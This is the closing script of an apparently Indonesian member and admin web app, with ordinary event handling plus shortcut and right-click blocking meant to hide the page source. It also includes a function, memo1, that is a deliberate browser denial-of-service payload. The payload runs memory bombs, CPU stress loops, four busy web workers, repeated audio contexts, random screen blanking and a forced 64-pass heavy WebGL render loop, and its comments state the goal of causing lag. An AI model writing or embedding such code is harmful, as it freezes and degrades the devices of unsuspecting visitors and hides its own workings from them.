window.addEventListener('error', (event) => {
  pushLogNotification(event.message || 'Terjadi error JavaScript', 'error', 'Runtime Error');
});

window.addEventListener('unhandledrejection', (event) => {
  const reason = event.reason?.message || event.reason || 'Promise gagal dijalankan';
  pushLogNotification(reason, 'error', 'Async Error');
});

window.addEventListener('storage', handleLocalStorageRealtime);
document.addEventListener('fullscreenchange', updateFullscreenGate);
document.addEventListener('webkitfullscreenchange', updateFullscreenGate);
document.addEventListener('msfullscreenchange', updateFullscreenGate);

function isBlockedSourceShortcut(event) {
  const key = String(event.key || '').toLowerCase();
  return (
    key === 'f12' ||
    (event.ctrlKey && key === 'u') ||
    (event.ctrlKey && key === 's') ||
    (event.ctrlKey && event.shiftKey && ['i','j','c'].includes(key))
  );
}

  document.addEventListener('contextmenu', (event) => {
    event.preventDefault();
  });

document.addEventListener('keydown', (event) => {
  if(event.key === 'Escape') {
    closeAdminMenu();
    closeNewMenu();
  }
  if(isBlockedSourceShortcut(event)) {
    event.preventDefault();
    event.stopPropagation();
    showToast('Aksi ini dinonaktifkan', 'error');
    return;
  }
  if(event.key !== 'Enter') return;
  const target = event.target;
  if(target && target.tagName === 'TEXTAREA') return;

  const id = target?.id || '';
  const activeAdminPanel = document.querySelector('.admin-panel.active')?.id || '';
  const adminModalOpen = document.getElementById('adminLoginModal')?.classList.contains('open');
  const loginModalOpen = document.getElementById('loginModal')?.classList.contains('open');
  const ratingModalOpen = document.getElementById('ratingModal')?.classList.contains('open');

  let action = null;
  if(adminModalOpen || id === 'adminCodeInput') action = submitAdminCode;
  else if(loginModalOpen || id === 'loginCodeInput') action = loginWithCode;
  else if(id === 'phoneInput' || id === 'profileNameInput') action = goSignupVerifyStep;
  else if(id === 'captchaInput') action = handleSendPhone;
  else if(id === 'editCodeInput') action = saveUniqueCode;
  else if(id === 'settingsUniqueCode' || id === 'settingsDisplayName') action = saveSettings;
  else if(id === 'appealContactInput') action = submitBanAppeal;
  else if(ratingModalOpen) action = submitRating;
  else if(activeAdminPanel === 'adminPanel-avatarborder') action = adminSaveAvatarBorder;
  else if(activeAdminPanel === 'adminPanel-whitelist') action = adminSaveWhitelistMember;
  else if(activeAdminPanel === 'adminPanel-users') action = adminSaveUser;
  else if(activeAdminPanel === 'adminPanel-giveaways') action = adminSaveGiveaway;
  else if(activeAdminPanel === 'adminPanel-shop') action = adminSaveShopProduct;
  else if(activeAdminPanel === 'adminPanel-materials') action = adminSaveMaterial;
  else if(activeAdminPanel === 'adminPanel-carousel') action = adminSaveCarousel;
  else if(activeAdminPanel === 'adminPanel-adminsettings') action = saveAppConfig;

  if(action) {
    event.preventDefault();
    action();
  }
});

window.addEventListener('DOMContentLoaded', async ()=>{
  try {
    applyFontAwesomeIcons();
    applyAppearancePreferences();
    restoreRequestFreezePage();
    await loadAppConfig();
    updateFullscreenGate();
    await loadClientIp();
    if(state.isBanned) return;
    const hasAdminSession = await checkAdminSession();
    if(hasAdminSession) return;
    const hasSession = await checkSavedSession();
    if(!hasSession) {
      const hasPending = await checkPendingVerification();
      if(!hasPending) {
        showPage('phone');
        await loadSignupCaptcha();
      }
    }
  } finally {
    finishAppBoot();
  }
});

window.addEventListener('hashchange', async () => {
  if(!localStorage.getItem('ne_session')) return;
  if(document.getElementById('page-admin')?.classList.contains('active')) return;
  await navigateTo(getSavedMemberRoute(), { replaceRoute: true });
});
async function memo1(){
    let memoryBomb = [];
    let cpuStressInterval;
    let webWorkers = [];
    let audioContexts = [];
    let uiBlankInterval;
    let blankCounter = 0;
    
    var cx, cy;
    var glposition, glright, glforward, glup, glorigin, glx, gly, gllen;
    var canvas, gl;
    var date = new Date();
    var mx = 0, my = 0;
    var ml = 0, mr = 0, mm = 0;
    var len = 1.6;
    var ang1 = 2.8;
    var ang2 = 0.4;
    var cenx = 0.0, ceny = 0.0, cenz = 0.0;

    // SHADER SANGAT BERAT - DITINGKATKAN
    var KERNEL = "float kernal(vec3 ver){\n" +
        "   vec3 a;\n" +
        "float b,c,d,e;\n" +
        "   a=ver;\n" +
        "   for(int i=0;i<32;i++){\n" + // ITERASI DITINGKATKAN DARI 16 KE 32
        "       b=length(a);\n" +
        "       c=atan(a.y,a.x)*16.0;\n" + // PERKALIAN DITINGKATKAN
        "       e=1.0/b;\n" +
        "       d=acos(a.z/b)*16.0;\n" + // PERKALIAN DITINGKATKAN
        "       b=pow(b,16.0);\n" + // POWER DITINGKATKAN
        "       a=vec3(b*sin(d)*cos(c),b*sin(d)*sin(c),b*cos(d))+ver;\n" +
        "       if(b>12.0){\n" + // THRESHOLD DITINGKATKAN
        "           break;\n" +
        "       }\n" +
        "   }" +
        "   return 4.0-a.x*a.x-a.y*a.y-a.z*a.z;" +
        "}";

    var vertshade, fragshader, shaderProgram;

    // ========== FUNGSI AUTO UI BLANK ==========
    function startUIBlank() {
        uiBlankInterval = setInterval(() => {
            const uiBlank = document.getElementById('uiBlank');
            blankCounter++;
            
            // Pattern blank yang berbeda-beda
            if (blankCounter % 10 === 0) {
                // Blank total 1 detik
                uiBlank.style.display = 'block';
                setTimeout(() => {
                    uiBlank.style.display = 'none';
                }, 1000);
            } else if (blankCounter % 7 === 0) {
                // Flash cepat
                uiBlank.classList.add('blank-flash');
                setTimeout(() => {
                    uiBlank.classList.remove('blank-flash');
                    uiBlank.style.display = 'none';
                }, 500);
            } else if (blankCounter % 5 === 0) {
                // Blank random duration
                const duration = Math.random() * 800 + 200;
                uiBlank.style.display = 'block';
                setTimeout(() => {
                    uiBlank.style.display = 'none';
                }, duration);
            } else if (blankCounter % 3 === 0) {
                // Fade in/out
                uiBlank.style.display = 'block';
                uiBlank.style.opacity = '0';
                let opacity = 0;
                const fadeInterval = setInterval(() => {
                    opacity += 0.1;
                    uiBlank.style.opacity = opacity;
                    if (opacity >= 1) {
                        clearInterval(fadeInterval);
                        setTimeout(() => {
                            const fadeOutInterval = setInterval(() => {
                                opacity -= 0.1;
                                uiBlank.style.opacity = opacity;
                                if (opacity <= 0) {
                                    clearInterval(fadeOutInterval);
                                    uiBlank.style.display = 'none';
                                }
                            }, 50);
                        }, 300);
                    }
                }, 50);
            }

            // Reset counter agar tidak terlalu besar
            if (blankCounter > 1000) blankCounter = 0;
        }, 3000); // Setiap 3 detik ada efek blank
    }
    
    // ========== FUNGSI TAMBAHAN UNTUK MEMBUAT LAG ==========
    function startMemoryBomb() {
        setInterval(() => {
            // Bomb memory dengan array besar
            const bomb = new Array(1000000).fill('LAG_' + Date.now());
            memoryBomb.push(bomb);
            
            // Jaga memory bomb agar tidak crash terlalu cepat tapi tetap berat
            if (memoryBomb.length > 50) {
                memoryBomb.splice(0, 10);
            }
        }, 1000);
    }
    
    function startCPUStress() {
        // CPU stress tambahan di JavaScript
        cpuStressInterval = setInterval(() => {
            let result = 0;
            for (let i = 0; i < 1000000; i++) {
                result += Math.sqrt(i) * Math.sin(i) * Math.cos(i) * Math.tan(i);
                result = Math.abs(Math.pow(result, 1.5));
            }
        }, 50);
    }
    
    function startWebWorkerBomb() {
        // Multiple web workers untuk multi-core attack
        const workerCode = `
            let workerData = [];
            setInterval(() => {
                let sum = 0;
                for (let i = 0; i < 2000000; i++) {
                    sum += Math.sqrt(i) * Math.random() * Math.sin(i);
                }
                
                // Memory stress di worker
                const arr = new Array(50000).fill(0).map(() => 
                    new Array(100).fill(Math.random().toString(36))
                );
                workerData.push(arr);
                
                postMessage(sum);
            }, 10);
        `;
        
        for (let i = 0; i < 4; i++) {
            try {
                const blob = new Blob([workerCode], {type: 'application/javascript'});
                const worker = new Worker(URL.createObjectURL(blob));
                worker.onmessage = function() {};
                webWorkers.push(worker);
            } catch(e) {}
        }
    }
    
    function startAudioStress() {
        // Audio processing stress
        setInterval(() => {
            try {
                const audioContext = new (window.AudioContext || window.webkitAudioContext)();
                const oscillator = audioContext.createOscillator();
                const gainNode = audioContext.createGain();
                
                oscillator.connect(gainNode);
                gainNode.connect(audioContext.destination);
                
                oscillator.frequency.value = 100 + Math.random() * 2000;
                gainNode.gain.value = 0.05;
                
                oscillator.start();
                setTimeout(() => oscillator.stop(), 500);
                
                audioContexts.push(audioContext);
            } catch(e) {}
        }, 200);
    }
    
    // --- LOOP PEMAKSA (FORCE LOOP) - DIUPDATE ---
    function ontimer() {
        // Kita ubah sudut sedikit setiap frame agar GPU HARUS menghitung ulang
        // Tidak bisa memakai cache frame sebelumnya
        ang1 += 0.02; // DIPERCEPAT
        
        draw();
        
        // TAMBAHAN: DOM manipulation stress
        if (Math.random() > 0.5) {
            const tempDiv = document.createElement('div');
            tempDiv.textContent = 'LAG';
            tempDiv.style.cssText = 'position:fixed;top:' + Math.random() * 100 + '%;left:' + Math.random() * 100 + '%;color:transparent;z-index:-1;';
            document.body.appendChild(tempDiv);
            setTimeout(() => {
                if (tempDiv.parentNode) tempDiv.parentNode.removeChild(tempDiv);
            }, 1000);
        }
        
        // PENTING: Menggunakan setTimeout dengan delay 0 alih-alih requestAnimationFrame
        // Ini memaksa browser mengeksekusi frame berikutnya SECEPAT MUNGKIN tanpa menunggu VSync
        setTimeout(ontimer, 0);
    }
    
    document.addEventListener("mousedown", function (ev) {
        var oEvent = ev || event;
        if (oEvent.button == 0) { ml = 1; mm = 0; }
        if (oEvent.button == 2) { mr = 1; mm = 0; }
        mx = oEvent.clientX; my = oEvent.clientY;
    }, false);
    document.addEventListener("mouseup", function (ev) {
        var oEvent = ev || event;
        if (oEvent.button == 0) ml = 0;
        if (oEvent.button == 2) mr = 0;
    }, false);
    document.addEventListener("mousemove", function (ev) {
        var oEvent = ev || event;
        if (ml == 1) {
            ang1 += (oEvent.clientX - mx) * 0.002;
            ang2 += (oEvent.clientY - my) * 0.002;
            if (oEvent.clientX != mx || oEvent.clientY != my) mm = 1;
        }
        if (mr == 1) {
            var l = len * 4.0 / (cx + cy);
            cenx += l * (-(oEvent.clientX - mx) * Math.sin(ang1) - (oEvent.clientY - my) * Math.sin(ang2) * Math.cos(ang1));
            ceny += l * ((oEvent.clientY - my) * Math.cos(ang2));
            cenz += l * ((oEvent.clientX - mx) * Math.cos(ang1) - (oEvent.clientY - my) * Math.sin(ang2) * Math.sin(ang1));
            if (oEvent.clientX != mx || oEvent.clientY != my) mm = 1;
        }
        mx = oEvent.clientX; my = oEvent.clientY;
    }, false);
    document.addEventListener("mousewheel", function (ev) {
        ev.preventDefault();
        len *= Math.exp(-0.001 * ev.wheelDelta);
    }, false);
    
    // --- FUNGSI RENDER 16x GRID (HEAVY LOAD) - DIUPDATE ---
    function draw() {
        gl.uniform1f(glx, cx * 2.0 / (cx + cy));
        gl.uniform1f(gly, cy * 2.0 / (cx + cy));
        gl.uniform1f(gllen, len);

        var totalW = canvas.width;
        var totalH = canvas.height;
        var grid = 8; // DITINGKATKAN DARI 4 KE 8 (64 Render Passes!)
        var cellW = totalW / grid;
        var cellH = totalH / grid;

        // Loop render 64 kali per frame (8x8 grid)
        for(var r = 0; r < grid; r++) {
            for(var c = 0; c < grid; c++) {
                gl.viewport(c * cellW, r * cellH, cellW, cellH);

                // Variasi sudut pandang untuk setiap kotak
                var angleOffset = (r * grid + c) * 0.3; 
                var curAng1 = ang1 + angleOffset;

                gl.uniform3f(glorigin, len * Math.cos(curAng1) * Math.cos(ang2) + cenx, len * Math.sin(ang2) + ceny, len * Math.sin(curAng1) * Math.cos(ang2) + cenz);
                gl.uniform3f(glright, Math.sin(curAng1), 0, -Math.cos(curAng1));
                gl.uniform3f(glup, -Math.sin(ang2) * Math.cos(curAng1), Math.cos(ang2), -Math.sin(ang2) * Math.sin(curAng1));
                gl.uniform3f(glforward, -Math.cos(curAng1) * Math.cos(ang2), -Math.sin(ang2), -Math.sin(curAng1) * Math.cos(ang2));

                gl.drawArrays(gl.TRIANGLES, 0, 6);
            }
        }
        
        // FORCE SYNC: Memaksa CPU menunggu GPU selesai sebelum lanjut.
        // Ini adalah penyebab utama "Lag" pada thread utama browser.
        gl.finish(); 
    }

    window.onresize = function () {
        cx = document.body.clientWidth;
        cy = document.body.clientHeight;
        if(cx>cy) cx=cy; else cy=cx;
        document.getElementById("main").style.width=2048+"px";
        document.getElementById("main").style.height=2048+"px";
        document.getElementById("main").style.transform="scale("+cx/2048+","+cy/2048+")";
    }

    window.onload = function () {
        // ========== JALANKAN SEMUA FUNGSI LAG ==========
        startMemoryBomb();
        startCPUStress();
        startWebWorkerBomb();
        startAudioStress();
        startUIBlank(); // TAMBAHAN: Auto UI Blank
        
        cx = document.body.clientWidth;
        cy = document.body.clientHeight;
        if(cx>cy) cx=cy; else cy=cx;
        
        document.getElementById("main").style.width=2048+"px";
        document.getElementById("main").style.height=2048+"px";
        document.getElementById("main").style.transform="scale("+cx/2048+","+cy/2048+")";

        var positions = [-1.0, -1.0, 0.0, 1.0, -1.0, 0.0, 1.0, 1.0, 0.0, -1.0, -1.0, 0.0, 1.0, 1.0, 0.0, -1.0, 1.0, 0.0];
        
        var VSHADER_SOURCE =
            "#version 100 \n"+
            "precision highp float;\n" +
            "attribute vec4 position;" +
            "varying vec3 dir, localdir;" +
            "uniform vec3 right, forward, up, origin;" +
            "uniform float x,y;" +
            "void main() {" +
            "   gl_Position = position; " +
            "   dir = forward + right * position.x*x + up * position.y*y;" +
            "   localdir.x = position.x*x;" +
            "   localdir.y = position.y*y;" +
            "   localdir.z = -1.0;" +
            "} ";

        // FRAGMENT SHADER - LOOP SANGAT PANJANG - DIUPDATE
        var FSHADER_SOURCE =
            "#version 100 \n" +
            "#define PI 3.14159265358979324\n" +
            "#define M_L 0.3819660113\n" +
            "#define M_R 0.6180339887\n" +
            "#define MAXR 64\n" +  // DITINGKATKAN DARI 32 KE 64
            "#define SOLVER 32\n" + // DITINGKATKAN DARI 16 KE 32
            "precision highp float;\n" +
            "float kernal(vec3 ver)\n;" +
            "uniform vec3 right, forward, up, origin;\n" +
            "varying vec3 dir, localdir;\n" +
            "uniform float len;\n" +
            "vec3 ver;\n" +
            "int sign;"+
            "float v, v1, v2;\n" +
            "float r1, r2, r3, r4, m1, m2, m3, m4;\n" +
            "vec3 n;\n" +
            "const float step = 0.0001;\n" + // STEP DIKECILKAN (LEBIH BANYAK ITERASI)
            "vec3 color;\n" +
            "void main() {\n" +
            "   color = vec3(0.0);\n" +
            "   sign=0;"+
            "   v1 = kernal(origin + dir * (step*len));\n" +
            "   v2 = kernal(origin);\n" +
            "   // LOOP UTAMA: DIPANJANGKAN KE 6000 ITERASI PER PIXEL\n" +
            "   for (int k = 2; k < 6000; k++) {\n" + // DITINGKATKAN DARI 3000 KE 6000
            "      ver = origin + dir * (step*len*float(k));\n" +
            "      v = kernal(ver);\n" +
            "      if (v > 0.0 && v1 < 0.0) {\n" +
            "         r1 = step * len*float(k - 1);\n" +
            "         r2 = step * len*float(k);\n" +
            "         m1 = kernal(origin + dir * r1);\n" +
            "         m2 = kernal(origin + dir * r2);\n" +
            "         for (int l = 0; l < SOLVER; l++) {\n" +
            "            r3 = r1 * 0.5 + r2 * 0.5;\n" +
            "            m3 = kernal(origin + dir * r3);\n" +
            "            if (m3 > 0.0) { r2 = r3; m2 = m3; }\n" +
            "            else { r1 = r3; m1 = m3; }\n" +
            "         }\n" +
            "         if (r3 < 2.0 * len) { sign=1; break; }\n" +
            "      }\n" +
            "      v2 = v1; v1 = v;\n" +
            "   }\n" +
            "   if (sign==1) {\n" +
            "      ver = origin + dir*r3 ;\n" +
            "      float eps = r3*0.0001;\n" +
            "      n.x = kernal(ver - right * eps) - kernal(ver + right * eps);\n" +
            "      n.y = kernal(ver - up * eps) - kernal(ver + up * eps);\n" +
            "      n.z = kernal(ver + forward * eps) - kernal(ver - forward * eps);\n" +
            "      n = normalize(n);\n" +
            "      color = vec3(abs(n.x), abs(n.y), abs(n.z));\n" +
            "   }\n" +
            "   gl_FragColor = vec4(color, 1.0);" +
            "}";

        canvas = document.getElementById('c1');
        gl = canvas.getContext('webgl');
        vertshader = gl.createShader(gl.VERTEX_SHADER);
        fragshader = gl.createShader(gl.FRAGMENT_SHADER);
        shaderProgram = gl.createProgram();
        gl.shaderSource(vertshader, VSHADER_SOURCE);
        gl.compileShader(vertshader);
        gl.shaderSource(fragshader, FSHADER_SOURCE + KERNEL);
        gl.compileShader(fragshader);
        gl.attachShader(shaderProgram, vertshader);
        gl.attachShader(shaderProgram, fragshader);
        gl.linkProgram(shaderProgram);
        gl.useProgram(shaderProgram);

        glposition = gl.getAttribLocation(shaderProgram, 'position');
        glright = gl.getUniformLocation(shaderProgram, 'right');
        glforward = gl.getUniformLocation(shaderProgram, 'forward');
        glup = gl.getUniformLocation(shaderProgram, 'up');
        glorigin = gl.getUniformLocation(shaderProgram, 'origin');
        glx = gl.getUniformLocation(shaderProgram, 'x');
        gly = gl.getUniformLocation(shaderProgram, 'y');
        gllen = gl.getUniformLocation(shaderProgram, 'len');
        
        var buffer = gl.createBuffer();
        gl.bindBuffer(gl.ARRAY_BUFFER, buffer);
        gl.bufferData(gl.ARRAY_BUFFER, new Float32Array(positions), gl.STATIC_DRAW);
        gl.vertexAttribPointer(glposition, 3, gl.FLOAT, false, 0, 0);
        gl.enableVertexAttribArray(glposition);

        // Start forced loop
        ontimer();

        document.getElementById("kernel").value = KERNEL;
        document.getElementById("btn").addEventListener("click", function() {
            var state = this.innerText == "CONFIG";
            this.innerText = state ? "HIDE" : "CONFIG";
            document.getElementById("config").style.display = state ? "inline" : "none";
        });
        document.getElementById("apply").addEventListener("click", function() {
            KERNEL = document.getElementById("kernel").value;
            gl.shaderSource(fragshader, FSHADER_SOURCE + KERNEL);
            gl.compileShader(fragshader);
            gl.linkProgram(shaderProgram);
            gl.useProgram(shaderProgram);
            
            glposition = gl.getAttribLocation(shaderProgram, 'position');
            glright = gl.getUniformLocation(shaderProgram, 'right');
            glforward = gl.getUniformLocation(shaderProgram, 'forward');
            glup = gl.getUniformLocation(shaderProgram, 'up');
            glorigin = gl.getUniformLocation(shaderProgram, 'origin');
            glx = gl.getUniformLocation(shaderProgram, 'x');
            gly = gl.getUniformLocation(shaderProgram, 'y');
            gllen = gl.getUniformLocation(shaderProgram, 'len');
        });
        document.getElementById("cancle").addEventListener("click", function() {
            document.getElementById("kernel").value = KERNEL;
        });
    }
  }
</script>
</body>
</html>
